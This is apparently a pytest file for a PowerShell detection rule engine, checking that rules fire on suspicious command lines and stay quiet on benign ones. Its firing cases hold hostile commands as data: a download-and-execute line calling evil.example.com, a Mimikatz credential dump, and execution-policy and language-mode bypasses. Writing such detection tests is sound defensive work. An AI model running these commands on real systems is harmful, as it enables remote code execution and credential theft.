"""Phase 4A Subphase 2 — PowerShell rule expansion tests."""

from __future__ import annotations

from pathlib import Path

import pytest
from normalizer.models import ProcessCreateEvent
from rules.engine import RuleEngine

PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"


def _make_process_event(**kwargs) -> ProcessCreateEvent:
    defaults: dict = {
        "event_id": 1,
        "utc_time": "2026-07-06 10:00:00.000",
        "computer": "TEST-HOST",
        "process_guid": "{test-guid}",
        "process_id": 1234,
        "image": PS,
        "command_line": "powershell.exe",
        "current_directory": "C:\\",
        "user": "TEST-HOST\\User",
        "parent_process_id": 5678,
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "parent_command_line": "cmd.exe",
        "integrity_level": "Medium",
        "hashes": None,
    }
    defaults.update(kwargs)
    return ProcessCreateEvent(**defaults)


def _hits(engine: RuleEngine, event: ProcessCreateEvent, rule_id: str) -> bool:
    return any(h.rule_id == rule_id for h in engine.evaluate(event))


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    eng = RuleEngine(Path("rules"))
    eng.load()
    return eng


# ---------------------------------------------------------------------------
# PS_EXECUTION_POLICY_BYPASS_001
# ---------------------------------------------------------------------------


def test_ps_execution_policy_bypass_fires(engine: RuleEngine):
    event = _make_process_event(
        command_line="powershell.exe -ExecutionPolicy Bypass -File C:\\temp\\stage.ps1",
    )
    assert _hits(engine, event, "PS_EXECUTION_POLICY_BYPASS_001")


def test_ps_execution_policy_bypass_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(command_line="powershell.exe Get-Process")
    assert not _hits(engine, event, "PS_EXECUTION_POLICY_BYPASS_001")


# ---------------------------------------------------------------------------
# PS_INVOKE_EXPRESSION_001
# ---------------------------------------------------------------------------


def test_ps_invoke_expression_fires(engine: RuleEngine):
    event = _make_process_event(
        command_line=(
            "powershell.exe IEX (New-Object Net.WebClient).DownloadString("
            "'http://evil.example.com/payload.ps1')"
        ),
    )
    assert _hits(engine, event, "PS_INVOKE_EXPRESSION_001")


def test_ps_invoke_expression_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        command_line="powershell.exe Invoke-Expression 'Get-Date'",
    )
    assert not _hits(engine, event, "PS_INVOKE_EXPRESSION_001")


# ---------------------------------------------------------------------------
# PS_VERSION_DOWNGRADE_001
# ---------------------------------------------------------------------------


def test_ps_version_downgrade_fires(engine: RuleEngine):
    event = _make_process_event(command_line="powershell.exe -Version 2 -NoProfile")
    assert _hits(engine, event, "PS_VERSION_DOWNGRADE_001")


def test_ps_version_downgrade_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(command_line="powershell.exe -NoProfile Get-Service")
    assert not _hits(engine, event, "PS_VERSION_DOWNGRADE_001")


# ---------------------------------------------------------------------------
# PS_REFLECTIVE_ASSEMBLY_001
# ---------------------------------------------------------------------------


def test_ps_reflective_assembly_fires(engine: RuleEngine):
    event = _make_process_event(
        command_line=(
            "powershell.exe [System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,$null)"
        ),
    )
    assert _hits(engine, event, "PS_REFLECTIVE_ASSEMBLY_001")


def test_ps_reflective_assembly_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(command_line="powershell.exe Get-ChildItem C:\\Windows")
    assert not _hits(engine, event, "PS_REFLECTIVE_ASSEMBLY_001")


# ---------------------------------------------------------------------------
# PS_CREDENTIAL_ACCESS_001
# ---------------------------------------------------------------------------


def test_ps_credential_access_fires(engine: RuleEngine):
    event = _make_process_event(command_line="powershell.exe Invoke-Mimikatz -Command sekurlsa::logonpasswords")
    assert _hits(engine, event, "PS_CREDENTIAL_ACCESS_001")


def test_ps_credential_access_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(command_line="powershell.exe Get-LocalUser")
    assert not _hits(engine, event, "PS_CREDENTIAL_ACCESS_001")


# ---------------------------------------------------------------------------
# PS_CONSTRAINED_LANG_BYPASS_001
# ---------------------------------------------------------------------------


def test_ps_constrained_lang_bypass_fires(engine: RuleEngine):
    event = _make_process_event(
        command_line="powershell.exe $env:__PSLockdownPolicy=0; whoami",
    )
    assert _hits(engine, event, "PS_CONSTRAINED_LANG_BYPASS_001")


def test_ps_constrained_lang_bypass_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(command_line="powershell.exe Get-Process | Select-Object Name")
    assert not _hits(engine, event, "PS_CONSTRAINED_LANG_BYPASS_001")


# ---------------------------------------------------------------------------
# PS_WMI_EXEC_001
# ---------------------------------------------------------------------------


def test_ps_wmi_exec_fires(engine: RuleEngine):
    event = _make_process_event(
        command_line=(
            "powershell.exe Get-WmiObject Win32_Process -Filter \"Name='calc.exe'\""
        ),
    )
    assert _hits(engine, event, "PS_WMI_EXEC_001")


def test_ps_wmi_exec_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(command_line="powershell.exe Get-CimInstance Win32_OperatingSystem")
    assert not _hits(engine, event, "PS_WMI_EXEC_001")
